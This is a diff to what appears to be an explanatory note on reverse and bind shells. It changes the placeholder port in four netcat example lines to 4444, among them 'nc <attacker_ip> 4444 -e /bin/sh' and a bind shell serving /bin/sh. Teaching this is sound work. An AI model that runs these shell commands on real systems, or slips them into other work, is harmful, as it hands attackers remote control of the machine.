@@ -15,9 +15,9 @@ Victim (target) → Attacker (listener)
 
 ### Example with Netcat
 
-Attacker (listening): nc -lvnp <port> 
+Attacker (listening): nc -lvnp 4444 
 
-Target (connecting back): nc <attacker_ip> <port> -e /bin/sh
+Target (connecting back): nc <attacker_ip> 4444 -e /bin/sh
 
 ### Why is it effective?
 
@@ -57,9 +57,9 @@ Attacker → Victim (listening service)
 
 ### Example with Netcat
 
-Target (listening): nc -lvp <port> -e /bin/sh
+Target (listening): nc -lvnp 4444 -e /bin/sh
 
-Attacker (connecting): nc <target_ip> <port>
+Attacker (connecting): nc <target_ip> 4444
 
 ### Why is it less common?
 
